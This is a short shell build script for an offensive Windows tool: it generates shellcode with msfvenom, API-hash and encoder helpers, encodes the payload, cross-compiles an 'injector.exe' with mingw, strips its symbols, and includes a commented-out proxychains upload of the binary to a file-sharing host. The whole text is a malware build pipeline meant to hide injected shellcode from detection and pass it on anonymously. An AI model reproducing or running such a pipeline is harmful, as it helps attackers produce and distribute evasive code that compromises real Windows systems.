rm -f shellcode
#msfvenom -p windows/x64/exec CMD="cmd.exe" EXITFUNC="thread" > shellcode.bin
gcc hash.c -o hash
./hash > hash.h
gcc encode.c -o encode
./encode shellcode.bin shellcode
x86_64-w64-mingw32-gcc -O3 main.c -o injector.exe
strip -s ./injector.exe
#proxychains curl -T ./injector.exe oshi.at
